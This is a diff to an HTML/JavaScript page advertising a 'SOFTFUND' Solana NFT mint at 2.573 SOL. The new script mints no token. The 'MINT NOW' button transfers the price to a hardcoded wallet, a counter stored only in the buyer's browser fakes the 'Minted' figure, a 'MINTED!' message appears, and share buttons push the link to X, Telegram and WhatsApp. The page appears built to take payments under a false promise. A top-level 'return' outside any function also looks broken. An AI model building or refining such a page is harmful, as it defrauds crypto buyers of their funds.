@@ -13,22 +13,25 @@
       min-height:100vh;display:flex;align-items:center;justify-content:center;
       padding:20px;
     }
-    .container{max-width:420px;width:100%}
+    .container{max-width:420px;width:100%;text-align:center}
     h1{font-size:2.8rem;color:#00ff9d;margin-bottom:4px}
     .tag{font-size:1rem;color:#aaa;margin-bottom:12px}
     .price{font-size:2.2rem;color:#ffd700;font-weight:bold;margin:12px 0}
-    .stats{font-size:1rem;color:#ccc;margin-bottom:16px}
+    .stats{font-size:1rem;color:#ccc;margin-bottom:20px}
     button{
-      width:100%;max-width:340px;margin:8px auto;padding:16px;
-      font-size:1.4rem;background:#ffd700;color:#000;border:none;
-      border-radius:14px;cursor:pointer;font-weight:bold;
-      box-shadow:0 0 20px rgba(255,215,0,.6);transition:.3s;
+      width:100%;max-width:340px;margin:10px auto;padding:18px;
+      font-size:1.6rem;background:#ffd700;color:#000;border:none;
+      border-radius:16px;cursor:pointer;font-weight:bold;
+      box-shadow:0 0 25px rgba(255,215,0,.7);transition:.3s;
     }
-    button:hover{background:#ffed4e;transform:scale(1.04)}
-    button:disabled{background:#555;cursor:not-allowed}
+    button:hover{background:#ffed4e;transform:scale(1.05)}
+    button:disabled{background:#555;cursor:not-allowed;transform:none}
     .status{margin-top:12px;font-size:.95rem;min-height:22px;font-weight:bold}
     .loader{display:inline-block;width:12px;height:12px;border:2px solid #ffd700;border-radius:50%;border-top-color:transparent;animation:s 1s linear infinite;margin-right:4px;}
     @keyframes s{to{transform:rotate(360deg)}}
+    .socials{margin-top:30px;display:flex;gap:10px;justify-content:center}
+    .socials button{width:50px;height:50px;padding:0;font-size:1.8rem;border-radius:50%;background:#333;color:#fff;box-shadow:0 0 15px rgba(255,215,0,.5);}
+    .socials button:hover{background:#555}
   </style>
 </head>
 <body>
@@ -38,87 +41,98 @@
     <p class="price">2.5730 SOL</p>
     <p class="stats">Minted: <span id="minted">0</span> / 10,000</p>
 
-    <!-- CHOOSE WALLET -->
-    <button onclick="openWallet('phantom')">Phantom</button>
-    <button onclick="openWallet('trust')">Trust Wallet</button>
-    <button onclick="openWallet('metamask')">MetaMask</button>
+    <button id="mintBtn">MINT NOW</button>
 
     <div id="status" class="status"></div>
+
+    <div class="socials">
+      <button onclick="share('x')">X</button>
+      <button onclick="share('telegram')">T</button>
+      <button onclick="share('whatsapp')">W</button>
+    </div>
   </div>
 
   <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
 
   <script>
     const PRICE = 2.5730 * 1e9;
-    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue"; // YOUR WALLET
+    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
+    const MINT_URL = location.href;
+    const SHARE_TEXT = "SOFTFUND MINT IS LIVE! 2.5730 SOL | 10K Supply";
+    const SHARE_LINK = `${SHARE_TEXT}\n\nMint: ${MINT_URL}\n\n#Solana #SOFTFUND`;
+
     let count = localStorage.getItem('softfund_mint') ? parseInt(localStorage.getItem('softfund_mint')) : 0;
     document.getElementById('minted').textContent = count;
 
     const status = document.getElementById("status");
+    const btn = document.getElementById("mintBtn");
 
     function setStatus(txt, color) {
       status.innerHTML = txt;
       status.style.color = color;
     }
 
-    // OPEN WALLET APP FROM CHROME
-    function openWallet(type) {
-      const url = location.href;
-      let deepLink = "";
-
-      if (type === 'phantom') {
-        deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`;
-      } else if (type === 'trust') {
-        deepLink = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`;
-      } else if (type === 'metamask') {
-        deepLink = `https://metamask.app.link/dapp/${location.host}${location.pathname}`;
-      }
-
-      setStatus("Opening wallet... <span class='loader'></span>", "#ffd700");
-      location.href = deepLink;
+    function share(p) {
+      let url = p==='x' ? `https://x.com/intent/post?text=${encodeURIComponent(SHARE_LINK)}` :
+                p==='telegram' ? `https://t.me/share/url?url=${MINT_URL}&text=${encodeURIComponent(SHARE_TEXT)}` :
+                `https://wa.me/?text=${encodeURIComponent(SHARE_LINK)}`;
+      window.open(url, '_blank');
     }
 
-    // RUN ONLY INSIDE WALLET BROWSER
-    window.addEventListener("load", () => {
+    // PHANTOM-FRIENDLY DEEP LINK
+    function openPhantom() {
+      const url = encodeURIComponent(location.href);
+      location.href = `https://phantom.app/ul/browse/${url}?ref=softfund`;
+    }
+
+    // FROM CHROME
+    if (!window.solana && !window.trustwallet && !window.ethereum) {
+      btn.onclick = openPhantom;
+      setStatus("Click MINT → Phantom opens → Approve", "#ffd700");
+      return;
+    }
+
+    // INSIDE WALLET — AUTO MINT
+    btn.onclick = async () => {
+      btn.disabled = true;
+      setStatus("Connecting... <span class='loader'></span>", "#ffd700");
+
       const provider = window.solana || window.trustwallet?.Provider?.solana || window.ethereum;
-      if (!provider) return;
 
-      // Auto-connect & mint
-      (async () => {
-        try {
-          setStatus("Connecting... <span class='loader'></span>", "#ffd700");
-          if (!provider.isConnected) await provider.connect();
+      try {
+        if (!provider.isConnected) await provider.connect();
+        setStatus("Sending 2.5730 SOL... <span class='loader'></span>", "#ffd700");
 
-          setStatus("Connected! Preparing payment... <span class='loader'></span>", "#ffd700");
+        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        const tx = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: provider.publicKey,
+            toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
+            lamports: PRICE,
+          })
+        );
 
-          const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-          const tx = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-              fromPubkey: provider.publicKey,
-              toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
-              lamports: PRICE,
-            })
-          );
+        const { blockhash } = await conn.getLatestBlockhash();
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = provider.publicKey;
 
-          const { blockhash } = await connection.getLatestBlockhash();
-          tx.recentBlockhash = blockhash;
-          tx.feePayer = provider.publicKey;
+        // THIS TRIGGERS PHANTOM POPUP
+        const { signature } = await provider.signAndSendTransaction(tx);
+        await conn.confirmTransaction(signature);
 
-          // THIS TRIGGERS THE PAYMENT POPUP
-          const signed = await provider.signAndSendTransaction(tx);
-          await connection.confirmTransaction(signed.signature);
+        count++;
+        localStorage.setItem('softfund_mint', count);
+        document.getElementById('minted').textContent = count;
 
-          count++;
-          localStorage.setItem('softfund_mint', count);
-          document.getElementById('minted').textContent = count;
+        setStatus(`MINTED! <a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#00ff9d">View</a>`, "#00ff9d");
+        setTimeout(() => { btn.disabled = false; setStatus(""); }, 4000);
 
-          setStatus(`MINTED! <a href="https://solscan.io/tx/${signed.signature}" target="_blank" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
-
-        } catch (err) {
-          setStatus("Payment failed or rejected", "#ff5555");
-        }
-      })();
-    });
+      } catch (e) {
+        console.error(e);
+        setStatus("Rejected or failed", "#ff5555");
+        btn.disabled = false;
+      }
+    };
   </script>
 </body>
 </html>
